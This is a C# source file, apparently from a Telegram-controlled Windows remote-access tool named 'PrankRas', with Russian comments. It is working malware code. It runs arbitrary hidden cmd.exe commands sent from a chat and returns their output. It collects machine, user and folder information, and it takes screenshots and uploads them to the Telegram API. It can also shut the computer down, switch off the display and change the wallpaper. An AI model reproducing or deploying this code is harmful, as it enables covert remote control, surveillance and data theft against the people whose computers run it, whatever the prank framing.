using System;
using System.Diagnostics;
using PrankRas;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Net;
using System.Windows.Forms;
using System.IO;
using System.Threading.Tasks;
using System.Net.Http;
using System.Linq;

class PerformCommand
{
    string[] Commands;
    bool cmdMode = false;
    public void СommandProcessing(string message)
    {
        message = message.ToLower();
        if (cmdMode)//Если режим коммандной строки не включено,то чекаем наличие команды в основном списке
            CMD(message);
        else
        {
            Commands = message.Split();
            ProcessTheCommand(Commands[0]);
        }
    }
    private void ProcessTheCommand(string DoIt)
    {
        switch (DoIt)
        {
            case "/help": { SendAllCommands(); break; }//Возвращает все команды

            case "shutdown": { ShellConsoleCommand("shutdown -f -s -t " + Commands[1]); Program.SendMessage("--Выключаю компьютер--", Program.ID_CHAT); break; }//30 секунд и выключаюсь

            case "setcoordinates": { Cursor.Position = new System.Drawing.Point(Convert.ToInt32(Commands[1]), Convert.ToInt32(Commands[2])); Program.SendMessage("--Координаты установленно--", Program.ID_CHAT); break; }//Установка координат мыши

            case "setdesktop": { SetWallpaper(Commands[1], 10, 0); Program.SendMessage("--Обои установленны--", Program.ID_CHAT); break; }//установка обой рабочего стола

            case "displayoff": { SendMessage((IntPtr)HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2); Program.SendMessage("--Дисплей отключен--", Program.ID_CHAT); break; }//отключение дисплея

            case "messagebox": { string _temp = ""; for (int i = 1; i <= Commands.Length - 1; i++) _temp += Commands[i] + " "; MessageBox.Show(_temp); Program.SendMessage("--Сообщение выведенно--", Program.ID_CHAT); break; }//Вывести messageBox

            case "beep": { Console.Beep(Convert.ToInt32(Commands[1]), Convert.ToInt32(Commands[2])); Program.SendMessage("--Звук проигран--", Program.ID_CHAT); break; }//Произвести звук

            case "/info": { GetAndSendInfoAboutThisComputer(); break; }//Возвращает информацию о данном компьютере

            case "cmdmode": { if (Commands[1] == "on") { cmdMode = true; Program.SendMessage(".-.-Вошел в режим консоли.-.-", Program.ID_CHAT); } else { cmdMode = false; Program.SendMessage(".-.-Вышел из режима консоли.-.-", Program.ID_CHAT); } break; }

            case "getscreen": { GetScreenShot(); break; }//Возвращает Скриншот экрана

            case "Version": { Program.SendMessage("Версия v1.2", Program.ID_CHAT); break; }//Возвращает версию программы

            default: Program.SendMessage("===Команда не найдена===", Program.ID_CHAT); break;
        }
    }
    private void ShellConsoleCommand(string command)
    {
        Process MyProcess = new Process();
        ProcessStartInfo MyStIn = new ProcessStartInfo();
        MyStIn.FileName = "cmd.exe";
        MyStIn.RedirectStandardError = false;
        MyStIn.RedirectStandardOutput = false;
        MyStIn.RedirectStandardInput = false;
        MyStIn.UseShellExecute = false;
        MyStIn.CreateNoWindow = true;
        MyStIn.Arguments = "/D /c" + command;
        MyProcess.StartInfo = MyStIn;
        MyProcess.Start();
        MyProcess.Dispose();
    }//выполнение консольных команд,без ответа

    #region /help
    private void SendAllCommands()
    {
        Program.SendMessage("shutdown {Через сколько секунд выключить} - Выключение компьютера", Program.ID_CHAT);

        Program.SendMessage("setcoordinates {X} {Y} - Установка координат мыши на мониторе", Program.ID_CHAT);

        Program.SendMessage("setdesktop {имя картинки.jpg} - Установка обоев на компьютере", Program.ID_CHAT);

        Program.SendMessage("displayoff - Переводит монитор в режим ожидания(Затемняет)", Program.ID_CHAT);

        Program.SendMessage("messagebox {и текст сообщения} - Выводит MessageBox с указанным текстом", Program.ID_CHAT);

        Program.SendMessage("beep {Частота} {Длительнось,в миллесукундах} - Воспроизводит звук с узказанной частотой и длительностью", Program.ID_CHAT);

        Program.SendMessage("/info - Возвращает Информацию о компьютере", Program.ID_CHAT);

        Program.SendMessage("cmdmode {ON/OFF} - Активирует режим cmd.exe,будет соответствующее уведомление.Все что будет написанно после,будет обрабатывать cmd.exe компьютера,где запущенна программа", Program.ID_CHAT);

        Program.SendMessage("getscreen - Возвращает скриншот экрана", Program.ID_CHAT);

        Program.SendMessage("Version - Возвращает текущую версию программы", Program.ID_CHAT);
    }
    #endregion
    #region /InfoUser
    private void GetAndSendInfoAboutThisComputer()
    {
        string _info = "";
        _info += "Имя:" + Environment.MachineName + Environment.NewLine;

        _info += "Домен:" + Environment.UserDomainName + Environment.NewLine;

        _info += "Юзер:" + Environment.UserName + Environment.NewLine;

        ProcessStartInfo psiOpt = new ProcessStartInfo(@"cmd.exe", @"/C ver");
        psiOpt.WindowStyle = ProcessWindowStyle.Hidden;
        psiOpt.RedirectStandardOutput = true;
        psiOpt.UseShellExecute = false;
        psiOpt.CreateNoWindow = true;
        Process procCommand = Process.Start(psiOpt);
        StreamReader srIncoming = procCommand.StandardOutput;
        procCommand.WaitForExit();
        _info += "ОС:" + srIncoming.ReadToEnd();
        _info = _info.Replace("[", "").Replace("]", "").Replace("Microsoft", "").Replace("Version", "") + Environment.NewLine;


        _info += "Рабочий стол:" + Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + Environment.NewLine;

        _info += "Мои документы:" + Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + Environment.NewLine;

        _info += "Темп:" + Environment.GetFolderPath(Environment.SpecialFolder.Templates) + Environment.NewLine;

        _info += "Профиль:" + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + Environment.NewLine;

        Program.SendMessage(_info, Program.ID_CHAT);
    }
    #endregion
    #region Setdesktop
    const int SPI_SETDESKWALLPAPER = 20;
    const int SPIF_UPDATEINIFILE = 0x01;
    const int SPIF_SENDWININICHANGE = 0x02;
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    static void SetWallpaper(string fileName, int style, int tile)
    {
        using (var webClient = new WebClient())
            webClient.DownloadFile(new Uri("https://api.telegram.org/file/bot" + Program.Token + "/" + "photo\\/" + fileName), System.IO.Path.GetTempPath() + fileName);
        using (RegistryKey reg = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true))
        {
            reg.SetValue("WallpaperStyle", style.ToString());//10
            reg.SetValue("TileWallpaper", tile.ToString());//0
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, System.IO.Path.GetTempPath() + fileName, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
            Program.SendMessage("Фотография рабочего стола изменена", Program.ID_CHAT);
        }
    }
    #endregion
    #region DisplayOff
    private const int MOVE = 0x0001;
    private static int HWND_BROADCAST = 0xffff;
    private const int WM_SYSCOMMAND = 0x0112;
    private const int SC_MONITORPOWER = 0xF170;
    [DllImport("user32.dll")]
    private static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
    #endregion
    #region CMD
    private string CmdPerformCommand(string command)
    {
        ProcessStartInfo psiOpt = new ProcessStartInfo(@"cmd.exe", @"/C " + command);
        psiOpt.WindowStyle = ProcessWindowStyle.Hidden;
        psiOpt.RedirectStandardOutput = true;
        psiOpt.UseShellExecute = false;
        psiOpt.CreateNoWindow = true;
        Process procCommand = Process.Start(psiOpt);
        StreamReader srIncoming = procCommand.StandardOutput;
        procCommand.WaitForExit();
        string _returnText = srIncoming.ReadToEnd();
        if (_returnText == "")
            return "-/-/Выполнила-/-/";
        else
            return _returnText;
    }//выполнение консольных команд,c  возврщением информации
    private void CMD(string message)
    {
        if (message == "cmdmode off")
        { cmdMode = false; Program.SendMessage(".-.-Вышел из режима консоли.-.-", Program.ID_CHAT); }
        else
            Program.SendMessage(CmdPerformCommand(message), Program.ID_CHAT);
    }
    #endregion
    #region GetScreen
    private void GetScreenShot()
    {
        System.Drawing.Bitmap BM = new System.Drawing.Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
        System.Drawing.Graphics GH = System.Drawing.Graphics.FromImage(BM as System.Drawing.Image);
        GH.CopyFromScreen(0, 0, 0, 0, BM.Size);
        using (SaveFileDialog SFD = new SaveFileDialog())
        {
            SFD.FileName = Path.GetTempPath() + DateTime.Now.Day + DateTime.Now.Month + DateTime.Now.Year + ".png";
            BM.Save(SFD.FileName);
            //SendLocalPhoto(Program.ID_CHAT.ToString(),SFD.FileName, Program.Token).Wait();
            SendLocalDocument(Program.ID_CHAT.ToString(), SFD.FileName, Program.Token).Wait();
        }

    }
    //async static Task SendLocalPhoto(string chatId, string filePath, string token)
    //{
    //    var url = string.Format("https://api.telegram.org/bot{0}/sendPhoto", token);
    //    var fileName = filePath.Split('\\').Last();

    //    using (var form = new MultipartFormDataContent())
    //    {
    //        form.Add(new StringContent(chatId.ToString(), System.Text.Encoding.UTF8), "chat_id");

    //        using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
    //        {
    //            form.Add(new StreamContent(fileStream), "photo", fileName);

    //            using (var client = new HttpClient())
    //            {
    //                await client.PostAsync(url, form);
    //            }
    //        }
    //    }
    //}
    async static Task SendLocalDocument(string chatId, string filePath, string token)
    {
        var url = string.Format("https://api.telegram.org/bot{0}/sendDocument", token);
        var fileName = filePath.Split('\\').Last();

        using (var form = new MultipartFormDataContent())
        {
            form.Add(new StringContent(chatId.ToString(), System.Text.Encoding.UTF8), "chat_id");

            using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
            {
                form.Add(new StreamContent(fileStream), "document", fileName);

                using (var client = new HttpClient())
                {
                    await client.PostAsync(url, form);
                }
            }
        }
    }
    #endregion
}
